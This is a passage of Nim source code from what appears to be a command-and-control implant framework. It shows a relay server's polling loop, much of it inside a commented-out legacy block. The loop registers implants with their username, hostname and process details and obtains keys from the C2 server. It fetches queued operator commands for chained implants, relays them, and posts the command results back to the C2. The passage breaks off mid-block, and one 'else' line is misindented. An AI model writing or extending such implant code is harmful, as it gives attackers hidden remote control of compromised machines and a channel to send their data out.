            if g_relayServer.isListening:
                when defined debug:
                    echo ""
                    echo "┌─ 📡 RELAY SERVER POLLING CYCLE"
                    let stats = relay_commands.getConnectionStats(g_relayServer)
                    echo "├─ Port: " & $g_relayServer.port & " │ Connections: " & $stats.connections & " │ Fast: " & $g_serverFastMode
                    echo "└─────────────────────────────────────────────────────────"
                    echo ""
                    echo "[DEBUG] 🌐 HTTP Handler: Polling relay server for messages"
                
                # Declare messageCount outside try block for end-of-cycle logging
                var messageCount = 0
                
                try:
                    let messages = pollRelayServerMessages()  # Use function from relay_commands.nim
                    
                    when defined debug:
                        echo "[DEBUG] 🌐 HTTP Handler: Relay server returned " & $messages.len & " messages"
                        if messages.len > 0:
                            for i, msg in messages:
                                echo "[DEBUG] 🌐 HTTP Handler: Message " & $i & " - Type: " & $msg.msgType & ", From: " & msg.fromID & ", Payload: " & $msg.payload.len & " bytes"
                    
                    # Capture message count for end-of-cycle logging
                    messageCount = messages.len
                    
                    for msg in messages:
                        when defined debug:
                            echo "[DEBUG] 🌐 HTTP Handler: ===== PROCESSING MESSAGE ====="
                            echo "[DEBUG] 🌐 HTTP Handler: Message Type: " & $msg.msgType
                            echo "[DEBUG] 🌐 HTTP Handler: From ID: " & msg.fromID
                            echo "[DEBUG] 🌐 HTTP Handler: Route: " & $msg.route
                            echo "[DEBUG] 🌐 HTTP Handler: Payload Length: " & $msg.payload.len
                            echo "[DEBUG] 🌐 HTTP Handler: Payload (first 100 chars): " & (if msg.payload.len > 100: msg.payload[0..99] & "..." else: msg.payload)
                            echo "[DEBUG] 🌐 HTTP Handler: ============================="
                        
                        case msg.msgType:
                        of REGISTER:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Processing relay client registration"
                            
                            # Decrypt and parse registration data
                            let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Decrypted registration: " & decryptedPayload
                            
                            try:
                                let regData = parseJson(decryptedPayload)
                                let registration = RelayRegistration(
                                    clientId: regData["implantID"].getStr(),
                                    localIP: regData["localIP"].getStr(),
                                    username: regData["username"].getStr(),
                                    hostname: regData["hostname"].getStr(),
                                    osInfo: regData["osInfo"].getStr(),
                                    pid: regData["pid"].getInt(),
                                    processName: regData["processName"].getStr(),
                                    timestamp: epochTime().int64
                                )
                                
                                # CHECK IF THIS IS A NEW REGISTRATION OR RE-REGISTRATION
                                var assignedId: string
                                var encryptionKey: string
                                
                                when defined debug:
                                    echo "[DEBUG] 🔍 ID VALIDATION: Checking registration type..."
                                    echo "[DEBUG] 🔍 ID VALIDATION: clientId = '" & registration.clientId & "'"
                                    echo "[DEBUG] 🔍 ID VALIDATION: hostname = '" & registration.hostname & "'"
                                    echo "[DEBUG] 🔍 ID VALIDATION: username = '" & registration.username & "'"
                                
                                if registration.clientId == "PENDING-REGISTRATION":
                                    # NEW REGISTRATION: Forward to C2 to get assigned ID and encryption key
                                    when defined debug:
                                        echo "[DEBUG] 🆕 ID VALIDATION: NEW REGISTRATION detected"
                                        echo "[DEBUG] 🆕 HTTP Handler: NEW relay client registration - forwarding to C2"
                                        echo "[DEBUG] 🆕 ID VALIDATION: Requesting UNIQUE ID from C2..."
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🆕 ID VALIDATION: About to call C2 for NEW ID assignment..."
                                        echo "[DEBUG] 🆕 ID VALIDATION: Client info - IP: " & registration.localIP & ", hostname: " & registration.hostname
                                        echo "[DEBUG] 🆕 ID VALIDATION: CRITICAL - This should generate a UNIQUE ID!"
                                    
                                    let (newId, newKey) = webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                                              registration.localIP, registration.username, 
                                                                              registration.hostname, registration.osInfo, 
                                                                              registration.pid, registration.processName, true, "RELAY_CLIENT")
                                    assignedId = newId
                                    encryptionKey = newKey
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🆕 ID VALIDATION: C2 RESPONSE - assigned ID: '" & assignedId & "'"
                                        echo "[DEBUG] 🆕 ID VALIDATION: Key length: " & $newKey.len
                                        echo "[DEBUG] 🚨 CRITICAL: Validate this ID is UNIQUE and not in use by other clients!"
                                        
                                        # CRITICAL: Check if this ID is already in registry
                                        let currentClients = relay_commands.getConnectedClients(g_relayServer)
                                        if assignedId in currentClients:
                                            echo "[DEBUG] 🚨🚨🚨 IDENTITY COLLISION DETECTED! 🚨🚨🚨"
                                            echo "[DEBUG] 🚨 C2 assigned ID: '" & assignedId & "'"
                                            echo "[DEBUG] 🚨 But this ID is ALREADY IN USE by another client!"
                                            echo "[DEBUG] 🚨 Current clients: [" & currentClients.join(", ") & "]"
                                            echo "[DEBUG] 🚨 THIS IS A C2 BUG - REUSING ACTIVE CLIENT IDs!"
                                            echo "[DEBUG] 🚨🚨🚨 IDENTITY COLLISION DETECTED! 🚨🚨🚨"
                                        else:
                                            echo "[DEBUG] ✅ ID VALIDATION: New ID '" & assignedId & "' is unique (not in current registry)"
                                else:
                                    # RE-REGISTRATION: Client has existing ID, GET ENCRYPTION KEY FROM C2
                                    assignedId = registration.clientId  # Keep the existing ID
                                    
                                    # CRITICAL FIX: Get encryption key from C2 reconnect endpoint
                                    encryptionKey = getEncryptionKeyFromC2Reconnect(listener, registration.clientId)
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🔄 ID VALIDATION: RE-REGISTRATION detected"
                                        echo "[DEBUG] 🔄 ID VALIDATION: Input clientId: '" & registration.clientId & "'"
                                        echo "[DEBUG] 🔄 ID VALIDATION: Assigned ID: '" & assignedId & "'"
                                        echo "[DEBUG] 🔄 ID VALIDATION: Should be IDENTICAL (no change)"
                                        if assignedId != registration.clientId:
                                            echo "[DEBUG] 🚨🚨🚨 CRITICAL BUG: assignedId != registration.clientId! 🚨🚨🚨"
                                        echo "[DEBUG] 🔄 HTTP Handler: Got encryption key from C2 reconnect endpoint"
                                        echo "[DEBUG] 🔄 ID VALIDATION: Encryption key length: " & $encryptionKey.len
                                        echo "[DEBUG] 🔄 ID VALIDATION: This should fix the empty g_relayClientKey bug"
                                
                                # ADAPTIVE TIMING: Check if client is in fast mode and adapt server timing
                                if regData.hasKey("fastMode") and regData["fastMode"].getBool():
                                    g_serverFastMode = true
                                    g_adaptiveMaxSleep = 1000  # 1 second for fast mode
                                    when defined debug:
                                        echo "[DEBUG] 🚀 HTTP Handler: Client is in FAST_MODE - Server adapting to fast timing (1s)"
                                else:
                                    g_serverFastMode = false
                                    g_adaptiveMaxSleep = 2000  # 2 seconds for normal mode
                                    when defined debug:
                                        echo "[DEBUG] 🐌 HTTP Handler: Client is in normal mode - Server using normal timing (2s)"
                                
                                when defined debug:
                                    echo "[DEBUG] ⚙️  HTTP Handler: Server adaptive timing configured"
                                    echo "[DEBUG] ⚙️  HTTP Handler: - Fast mode: " & $g_serverFastMode
                                    echo "[DEBUG] ⚙️  HTTP Handler: - Max sleep: " & $g_adaptiveMaxSleep & "ms"
                                    if regData.hasKey("pollInterval"):
                                        echo "[DEBUG] ⚙️  HTTP Handler: - Client poll interval: " & $regData["pollInterval"].getInt() & "ms"
                                
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay registration forwarded to C2"
                                    echo "[DEBUG] 🌐 HTTP Handler: Original ID: " & registration.clientId
                                    echo "[DEBUG] 🔑 HTTP Handler: Got encryption key (length: " & $encryptionKey.len & ")"
                                
                                # Send response back to relay client
                                if assignedId != "":
                                    var responseData: JsonNode
                                    
                                    if encryptionKey != "":
                                        # NEW REGISTRATION: Send both ID and encryption key plus parent GUID
                                        responseData = %*{
                                            "id": assignedId,
                                            "key": encryptionKey,
                                            "parent_guid": listener.id  # This relay server's C2 ID becomes the client's parent
                                        }
                                        when defined debug:
                                            echo "[DEBUG] 🆕 HTTP Handler: Sending NEW ID, encryption key and parent GUID to client"
                                            echo "[DEBUG] 🆕 HTTP Handler: Parent GUID (this relay server): " & listener.id
                                            echo "[DEBUG] 🆕 HTTP Handler: Listener ID empty: " & $(listener.id == "")
                                    else:
                                        # RE-REGISTRATION: Send confirmation with existing ID (no new key) plus parent GUID
                                        responseData = %*{
                                            "id": assignedId,
                                            "status": "reconnected",
                                            "parent_guid": listener.id  # This relay server's C2 ID becomes the client's parent
                                        }
                                        when defined debug:
                                            echo "[DEBUG] 🔄 HTTP Handler: Sending RE-REGISTRATION confirmation with parent GUID to client"
                                            echo "[DEBUG] 🔄 HTTP Handler: Parent GUID (this relay server): " & listener.id
                                    
                                    let idMsg = createMessage(HTTP_RESPONSE,
                                        listener.id,  # Use relay server's real C2 ID, not generated ID
                                        @[registration.clientId, listener.id],  # Route with real IDs
                                        $responseData
                                    )
                                    
                                    # CRITICAL FIX: Use BROADCAST for NEW registrations (when encryption key is provided)
                                    # Use UNICAST only for RE-registrations (when status="reconnected")
                                    let stats = relay_commands.getConnectionStats(g_relayServer)
                                    if stats.connections > 0:
                                        if encryptionKey != "":
                                            # NEW REGISTRATION: Has encryption key = client doesn't have key yet = MUST BROADCAST
                                            discard relay_commands.broadcastMessage(g_relayServer, idMsg)
                                            when defined debug:
                                                echo "[DEBUG] 🌐 HTTP Handler: ✅ NEW registration response BROADCAST (key provided): " & assignedId
                                                echo "[DEBUG] 🌐 HTTP Handler: 🔑 Broadcasting encryption key to client: " & registration.clientId
                                        else:
                                            # RE-REGISTRATION: No new key = client already has key = CAN USE UNICAST
                                            let unicastSuccess = relay_commands.sendToClient(g_relayServer, registration.clientId, idMsg)
                                            when defined debug:
                                                if unicastSuccess:
                                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ RE-registration response UNICAST (no new key): " & registration.clientId
                                                else:
                                                    echo "[DEBUG] 🌐 HTTP Handler: ❌ UNICAST failed to client: " & registration.clientId & " - fallback to broadcast"
                                                    # Fallback to broadcast if unicast fails
                                                    discard relay_commands.broadcastMessage(g_relayServer, idMsg)
                                    else:
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ⚠️  No relay connections to send registration data to"
                                else:
                                    when defined debug:
                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ No valid ID for relay client registration"
                                
                            except Exception as e:
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ❌ Error parsing relay registration: " & e.msg
                        
                        of PULL:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: 📥 PULL request received from relay client: " & msg.fromID
                            
                            # Declare variables at case level to avoid scope issues
                            let originalId = listener.id
                            var originalKey = ""  # Will be set by safeKeySwap if needed
                            
                            # CRITICAL FIX: Check if this is ROOT relay server or chained relay server
                            if upstreamRelay.isConnected:
                                # CHAINED RELAY SERVER: Forward PULL upstream using relay protocol
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: 🔗 CHAINED RELAY SERVER - forwarding PULL upstream"
                                
                                # Forward the PULL message upstream preserving the route
                                let forwardedPull = createMessage(PULL,
                                    msg.fromID,  # Keep original fromID
                                    msg.route & @[listener.id],  # Add this relay server to route
                                    msg.payload  # Keep original payload
                                )
                                
                                let forwarded = relay_comm.sendMessage(upstreamRelay, forwardedPull)
                                
                                when defined debug:
                                    if forwarded:
                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ PULL forwarded upstream to parent relay"
                                    else:
                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to forward PULL upstream"
                            else:
                                # ROOT RELAY SERVER: Process PULL and convert to HTTP request to C2
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: 🏠 ROOT RELAY SERVER - processing PULL locally"
                                    echo "[DEBUG] 💓 PULL REQUEST: fromID = '" & msg.fromID & "'"
                                    echo "[DEBUG] 💓 PULL REQUEST: route = " & $msg.route
                                    let currentClients = relay_commands.getConnectedClients(g_relayServer)
                                    echo "[DEBUG] 💓 PULL REQUEST: Current registry: [" & currentClients.join(", ") & "]"
                                    echo "[DEBUG] 💓 PULL REQUEST: Client in registry: " & $(msg.fromID in currentClients)
                                
                                # SAFE KEY MANAGEMENT: Prepare to extract relay client's encryption key
                            
                                # Extract the relay client's encryption key from the PULL payload
                                let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
                                var relayClientKey = ""
                                
                                when defined debug:
                                    echo "[DEBUG] 🔍 ┌─────────── PULL KEY EXTRACTION DEBUG ───────────┐"
                                    echo "[DEBUG] 🔍 │ Raw payload length: " & $msg.payload.len & " │"
                                    echo "[DEBUG] 🔍 │ Decrypting with implantID: '" & msg.fromID & "' │"
                                    echo "[DEBUG] 🔍 │ Decrypted payload: " & decryptedPayload & " │"
                                    echo "[DEBUG] 🔍 │ Decrypted payload length: " & $decryptedPayload.len & " │"
                                    echo "[DEBUG] 🔍 └─────────────────────────────────────────────────┘"
                                
                                try:
                                    # Try to parse as JSON to get the encryption key
                                    let pullData = parseJson(decryptedPayload)
                                    let encryptedKey = pullData["key"].getStr()
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🔑 ┌─────────── KEY DECRYPTION DEBUG ───────────┐"
                                        echo "[DEBUG] 🔑 │ JSON parsing successful │"
                                        echo "[DEBUG] 🔑 │ Encrypted key from payload: " & encryptedKey & " │"
                                        echo "[DEBUG] 🔑 │ Encrypted key length: " & $encryptedKey.len & " │"
                                        echo "[DEBUG] 🔑 │ INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY & " │"
                                        echo "[DEBUG] 🔑 └─────────────────────────────────────────────┘"
                                    
                                    # Decrypt the relay client's encryption key using INITIAL_XOR_KEY
                                    relayClientKey = xorString(encryptedKey, INITIAL_XOR_KEY)
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🔓 ┌─────────── FINAL KEY RESULT ───────────┐"
                                        echo "[DEBUG] 🔓 │ Decrypted relayClientKey length: " & $relayClientKey.len & " │"
                                        if relayClientKey.len > 0:
                                            echo "[DEBUG] 🔓 │ Decrypted key preview: " & relayClientKey[0..min(7, relayClientKey.len-1)] & "... │"
                                            echo "[DEBUG] 🔓 │ ✅ Key extraction SUCCESSFUL │"
                                        else:
                                            echo "[DEBUG] 🔓 │ 🚨 Key extraction FAILED - empty result │"
                                        echo "[DEBUG] 🔓 └─────────────────────────────────────────┘"
                                except Exception as e:
                                    when defined debug:
                                        echo "[DEBUG] ⚠️  Failed to extract/decrypt encryption key from PULL payload: " & msg.fromID
                                        echo "[DEBUG] ⚠️  Error: " & e.msg
                                        echo "[DEBUG] ⚠️  Payload: " & decryptedPayload
                                        echo "[DEBUG] ⚠️  Using relay server's key as fallback"
                                
                                # Perform check-in to C2 for relay client using exported function
                                when defined debug:
                                    echo "[DEBUG] 💓 HTTP Handler: Making C2 check-in with relay client credentials"
                                    echo "[DEBUG] 💓 HTTP Handler: Client ID: " & msg.fromID
                                    echo "[DEBUG] 💓 HTTP Handler: Using encryption key length: " & $relayClientKey.len
                                    echo "[DEBUG] 💓 HTTP Handler: About to call getQueuedCommand() for relay client"
                                    echo "[DEBUG] 💓 HTTP Handler: C2 Host: " & listener.implantCallbackIp & ":" & listener.listenerPort
                                    echo "[DEBUG] 💓 HTTP Handler: Expected to prevent LATE status for: " & msg.fromID
                                    
                                let checkInStartTime = epochTime()
                                
                                # CLEAN FIX: Create dedicated relay client listener for getQueuedCommand()
                                let relayClientListener = createRelayClientListener(listener, msg.fromID, relayClientKey)
                                
                                let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(relayClientListener)
                                let checkInDuration = (epochTime() - checkInStartTime) * 1000.0  # Convert to ms
                                
                                when defined debug:
                                    echo "[DEBUG] 💓 HTTP Handler: getQueuedCommand() completed in " & $checkInDuration.int & "ms"
                                    echo "[DEBUG] 💓 HTTP Handler: Raw response analysis:"
                                    echo "[DEBUG] 💓 HTTP Handler: - Command empty: " & $(cmd == "")
                                    echo "[DEBUG] 💓 HTTP Handler: - Command is connection error: " & $(cmd == obf("NIMPLANT_CONNECTION_ERROR"))
                                    if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                                        echo "[DEBUG] 💓 HTTP Handler: ❌ CHECK-IN FAILED - C2 CONNECTION ERROR"
                                        echo "[DEBUG] 💓 HTTP Handler: ❌ Relay client " & msg.fromID & " will be marked as LATE!"
                                    elif cmd == "":
                                        echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - No commands for " & msg.fromID
                                    else:
                                        echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - Got command for " & msg.fromID
                                        echo "[DEBUG] 💓 HTTP Handler: - Command content: '" & cmd & "'"
                                        echo "[DEBUG] 💓 HTTP Handler: - Command length: " & $cmd.len
                                    echo "[DEBUG] 💓 HTTP Handler: - GUID content: '" & cmdGuid & "'"
                                    echo "[DEBUG] 💓 HTTP Handler: - Args count: " & $args.len
                                    if args.len > 0:
                                        echo "[DEBUG] 💓 HTTP Handler: - Args: " & $args
                                
                                # SECURITY: Clear the relay client's encryption key from memory AFTER all operations
                                clearSensitiveKey(relayClientKey)
                                
                                # CRITICAL: ALWAYS send a response to PULL requests!
                                if cmd != "" and cmd != obf("NIMPLANT_CONNECTION_ERROR"):
                                    when defined debug:
                                        echo "[DEBUG] 🌐 HTTP Handler: Sending command to relay client: " & cmd
                                        echo "[DEBUG] 🌐 HTTP Handler: Command GUID: " & cmdGuid
                                    
                                    # SIMPLIFIED APPROACH: C2 response is ALREADY encrypted with client's UNIQUE_KEY
                                    # Relay server CANNOT and SHOULD NOT read this - it's end-to-end encrypted
                                    # Just forward it using INITIAL_XOR_KEY (hop-to-hop encryption)
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🔐 SIMPLIFIED ENCRYPTION: End-to-end + hop-to-hop"
                                        echo "[DEBUG] 🔐 - C2 → Client: UNIQUE_KEY (end-to-end, relay can't read)"
                                        echo "[DEBUG] 🔐 - Relay → Client: INITIAL_XOR_KEY (hop-to-hop transport)"
                                        echo "[DEBUG] 🔐 - Command already encrypted by C2 with client's UNIQUE_KEY"
                                    
                                    # Create simple command payload (C2 response is already encrypted)
                                    let forwardPayload = %*{
                                        "cmdGuid": cmdGuid,
                                        "command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
                                        "args": args
                                    }
                                    
                                    # Create command message with SHARED KEY (hop-to-hop encryption)
                                    let cmdMsg = createMessage(COMMAND,
                                        getRelayServerID(),
                                        msg.route,
                                        $forwardPayload,
                                        false  # Use SHARED KEY (INITIAL_XOR_KEY) for hop-to-hop
                                    )
                                    
                                    # CRITICAL DEBUG: Check client registry before sending command
                                    when defined debug:
                                        echo "[DEBUG] 🎯 COMMAND ROUTING: Attempting to send command to client: '" & msg.fromID & "'"
                                        let connectedClients = relay_commands.getConnectedClients(g_relayServer)
                                        echo "[DEBUG] 🎯 COMMAND ROUTING: Connected clients: [" & connectedClients.join(", ") & "]"
                                        echo "[DEBUG] 🎯 COMMAND ROUTING: Target client in registry: " & $(msg.fromID in connectedClients)
                                    
                                    # Send command to SPECIFIC relay client (unicast)
                                    let success = relay_commands.sendToClient(g_relayServer, msg.fromID, cmdMsg)
                                    if success:
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Command sent to specific client: " & msg.fromID
                                    else:
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send command to client: " & msg.fromID
                                            echo "[DEBUG] 🚨 COMMAND ROUTING FAILURE: Client '" & msg.fromID & "' not found in registry!"
                                            echo "[DEBUG] 🚨 This means the auto-registration failed or client registry is corrupted!"
                                else:
                                    # NO COMMANDS or CONNECTION ERROR - Still send a response!
                                    when defined debug:
                                        if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                                            echo "[DEBUG] 🌐 HTTP Handler: ⚠️  C2 connection error for relay client " & msg.fromID & " - sending empty response"
                                        else:
                                            echo "[DEBUG] 🌐 HTTP Handler: 📭 No commands for relay client " & msg.fromID & " - sending empty response"
                                    
                                    # Send empty response to complete the PULL cycle
                                    let emptyResponse = createMessage(HTTP_RESPONSE,
                                        getRelayServerID(),
                                        msg.route,
                                        "NO_COMMANDS"
                                    )
                                    
                                    # Send empty response to SPECIFIC relay client (unicast)
                                    let success = relay_commands.sendToClient(g_relayServer, msg.fromID, emptyResponse)
                                    if success:
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Empty response sent to specific client: " & msg.fromID & " (PULL completed)"
                                    else:
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send empty response to client: " & msg.fromID
                                # End of ROOT RELAY SERVER processing
                        
                        of RESPONSE:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Received command result from relay client"
                            
                            # Decrypt response from relay client
                            let decryptedResponse = relay_protocol.smartDecrypt(msg.payload)
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Relay response: " & 
                                     (if decryptedResponse.len > 100: decryptedResponse[0..99] & "..." else: decryptedResponse)
                            
                            # Parse response to extract cmdGuid, result, and encryption key
                            var actualResult: string
                            var responseCmdGuid: string
                            var relayClientKey: string
                            
                            try:
                                # Try to parse as JSON (new structured format with encryption key)
                                let responseData = parseJson(decryptedResponse)
                                responseCmdGuid = responseData["cmdGuid"].getStr()
                                actualResult = responseData["result"].getStr()
                                
                                # Extract and decrypt the relay client's encryption key
                                let encryptedKey = responseData["key"].getStr()
                                relayClientKey = xorString(encryptedKey, INITIAL_XOR_KEY)
                                
                                when defined debug:
                                    echo "[DEBUG] 📋 ┌─────────── PARSED RESPONSE DATA ───────────┐"
                                    echo "[DEBUG] 📋 │ cmdGuid: " & responseCmdGuid & " │"
                                    echo "[DEBUG] 📋 │ Result length: " & $actualResult.len & " bytes │"
                                    echo "[DEBUG] 🔑 │ Decrypted key length: " & $relayClientKey.len & " │"
                                    echo "[DEBUG] 📋 │ Result (first 100 chars): " & (if actualResult.len > 100: actualResult[0..99] & "..." else: actualResult) & " │"
                                    echo "[DEBUG] 📋 └─────────────────────────────────────────────┘"
                            except:
                                # Fallback to old format (plain result)
                                actualResult = decryptedResponse
                                responseCmdGuid = ""
                                relayClientKey = ""
                                
                                when defined debug:
                                    echo "[DEBUG] 📋 ┌─────────── FALLBACK TO OLD FORMAT ───────────┐"
                                    echo "[DEBUG] 📋 │ Using plain result format │"
                                    echo "[DEBUG] 📋 │ Result length: " & $actualResult.len & " bytes │"
                                    echo "[DEBUG] ⚠️  │ No encryption key available │"
                                    echo "[DEBUG] 📋 └─────────────────────────────────────────────┘"
                            
                            # Send result to C2 using exported function
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Sending relay result to C2..."
                                echo "[DEBUG] 🌐 HTTP Handler: Using cmdGuid: " & responseCmdGuid & " for client: " & msg.fromID
                            
                            # CLEAN FIX: Create dedicated relay client listener for C2 result submission
                            let relayClientListener = createRelayClientListener(listener, msg.fromID, relayClientKey)
                            
                            # Send result to C2 with correct cmdGuid using dedicated listener
                            webClientListener.postCommandResults(relayClientListener, responseCmdGuid, actualResult)
                            
                            # SECURITY: Clear the relay client's encryption key from memory
                            clearSensitiveKey(relayClientKey)
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay result sent to C2"
                            
                            # Send confirmation back to relay client
                            let confirmMsg = createMessage(HTTP_RESPONSE,
                                getRelayServerID(),
                                msg.route,
                                "RESULT_SENT_TO_C2"
                            )
                            
                            # Send confirmation to SPECIFIC relay client (unicast)
                            let success = relay_commands.sendToClient(g_relayServer, msg.fromID, confirmMsg)
                            if success:
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Confirmation sent to specific client: " & msg.fromID
                            else:
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ⚠️  Failed to send confirmation to client: " & msg.fromID
                        

                        
                        of CHAIN_INFO:
                            when defined debug:
                                echo "[DEBUG] 🔗 HTTP Handler: ✅ CHAIN_INFO message received from relay client: " & msg.fromID
                                echo "[DEBUG] 🔗 HTTP Handler: ✅ This is the CRITICAL message that should forward to C2"
                                echo "[DEBUG] 🔗 HTTP Handler: Route: " & $msg.route
                                echo "[DEBUG] 🔗 HTTP Handler: Payload length: " & $msg.payload.len
                            
                            # ULTRA-SIMPLE FORWARDING: Relay server does PURE forwarding (no crypto)
                            when defined debug:
                                echo "[DEBUG] 🔗 HTTP Handler: ✅ PURE FORWARDING MODE - no decryption/encryption"
                                echo "[DEBUG] 🔗 HTTP Handler: Double-encrypted payload length: " & $msg.payload.len
                                echo "[DEBUG] 🔗 HTTP Handler: Forwarding directly to C2 without touching encryption"
                            
                            try:
                                # PURE FORWARDING: Just forward the double-encrypted message to C2
                                # C2 will handle: 1) INITIAL_XOR_KEY decrypt, 2) UNIQUE_KEY decrypt
                                
                                when defined debug:
                                    echo "[DEBUG] 🔗 Chain Info: ✅ ULTRA-SIMPLE forwarding - relay doesn't decrypt anything"
                                    echo "[DEBUG] 🔗 Chain Info: ✅ C2 will handle double decryption"
                                
                                # CLEAN FIX: Create dedicated relay client listener for C2 forwarding
                                let relayClientListener = createRelayClientListener(listener, msg.fromID)
                                
                                when defined debug:
                                    echo "[DEBUG] 🔗 Chain Info: ✅ Using dedicated relay client listener: " & msg.fromID
                                
                                # Send the raw double-encrypted payload directly to C2
                                # C2 endpoint /chain will handle double decryption
                                postRawData(relayClientListener, "/chain", msg.payload)
                                
                                when defined debug:
                                    echo "[DEBUG] 🔗 Chain Info: ✅ Raw double-encrypted data forwarded to C2"
                                
                            except Exception as e:
                                when defined debug:
                                    echo "[DEBUG] 🔗 Chain Info: ❌ Error forwarding chain info: " & e.msg
                        
                        of CONFIRMATION:
                            when defined debug:
                                echo "[DEBUG] 🔗 HTTP Handler: ✅ CONFIRMATION received from relay client: " & msg.fromID
                                echo "[DEBUG] 🔗 HTTP Handler: Processing client ID confirmation"
                            
                            # Process confirmation and update client registry
                            let confirmationPayload = relay_protocol.smartDecrypt(msg.payload)
                            
                            try:
                                let confirmData = parseJson(confirmationPayload)
                                let newId = confirmData["new_id"].getStr()
                                let oldId = confirmData["old_id"].getStr()
                                let parentGuid = confirmData["parent_guid"].getStr()
                                
                                when defined debug:
                                    echo "[DEBUG] 🔗 CONFIRMATION: Old ID: " & oldId
                                    echo "[DEBUG] 🔗 CONFIRMATION: New ID: " & newId
                                    echo "[DEBUG] 🔗 CONFIRMATION: Parent GUID: " & parentGuid
                                
                                # Update client registry - this is the critical fix
                                let updateSuccess = relay_comm.updateClientId(g_relayServer, oldId, newId)
                                
                                when defined debug:
                                    if updateSuccess:
                                        echo "[DEBUG] 🔗 CONFIRMATION: ✅ Client registry updated successfully"
                                    else:
                                        echo "[DEBUG] 🔗 CONFIRMATION: ❌ Failed to update client registry"
                                
                                # Send CONFIRMATION_ACK back to client
                                let ackMsg = relay_protocol.createConfirmationAckMessage(
                                    getRelayServerID(),
                                    @[newId, parentGuid],
                                    newId,
                                    if updateSuccess: "SUCCESS" else: "FAILED"
                                )
                                
                                let ackSent = relay_commands.sendToClient(g_relayServer, newId, ackMsg)
                                
                                when defined debug:
                                    if ackSent:
                                        echo "[DEBUG] 🔗 CONFIRMATION_ACK: ✅ Sent to client: " & newId
                                    else:
                                        echo "[DEBUG] 🔗 CONFIRMATION_ACK: ❌ Failed to send to client: " & newId
                            except Exception as e:
                                when defined debug:
                                    echo "[DEBUG] 🔗 CONFIRMATION: ❌ Error processing confirmation: " & e.msg
                        
                        of CONFIRMATION_ACK:
                            when defined debug:
                                echo "[DEBUG] 🔗 HTTP Handler: ✅ CONFIRMATION_ACK received (should not happen on server)"
                        

                        of COMMAND, FORWARD, HTTP_REQUEST, HTTP_RESPONSE:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: ℹ️  Ignoring relay message type: " & $msg.msgType
                    
                except Exception as e:
                    when defined debug:
                        echo "[DEBUG] 🌐 HTTP Handler: Error polling relay server: " & e.msg
                        
                when defined debug:
                    echo ""
                    echo "┌─ 📡 END RELAY SERVER POLLING CYCLE"
                    let finalStats = relay_commands.getConnectionStats(g_relayServer)
                    echo "├─ Processed: " & $messageCount & " messages │ Connections: " & $finalStats.connections & " │ Registered: " & $finalStats.registeredClients
                    echo "└─────────────────────────────────────────────────────────"
                    echo ""
                
                # 1.5. Legacy topology system removed - using distributed chain relationships
            ]#
            
            # End of legacy relay server polling block
            
            # 2. Handle command results - send to C2
            for result in g_commandsToC2:
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Sending result to C2 (first 100 chars): " & 
                         (if result.result.len > 100: result.result[0..99] & "..." else: result.result)
                
                webClientListener.postCommandResults(listener, result.guid, result.result)
                
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Result sent to C2"
            
            g_commandsToC2 = @[]  # Clear processed results
            
            # 3. CRITICAL: Poll C2 for commands (this does the check-in!)
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Polling C2 for commands (check-in)"
            
            let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(listener)
            
            when defined debug:
                if cmd != "":
                    echo "[DEBUG] 🌐 HTTP Handler: Got command from C2: " & cmd
            else:
                    echo "[DEBUG] 🌐 HTTP Handler: No commands from C2 (check-in successful)"
            
            if cmd != "":
                # CRITICAL FIX: Filter out internal error messages that are NOT real commands
                if cmd == "NIMPLANT_CONNECTION_ERROR" or cmd.startsWith("ERROR:") or cmd == "NO_COMMANDS":
                    when defined debug:
                        echo "[DEBUG] 🚫 HTTP Handler: Ignoring internal status message: " & cmd
                        echo "[DEBUG] 🚫 HTTP Handler: This is NOT a real command, skipping processing"
                else:
                    # HTTP Relay System: Legacy intelligent routing commented out
                    # In HTTP relay system, commands are routed via X-Next-Hop headers, not via relay_commands
                    #[
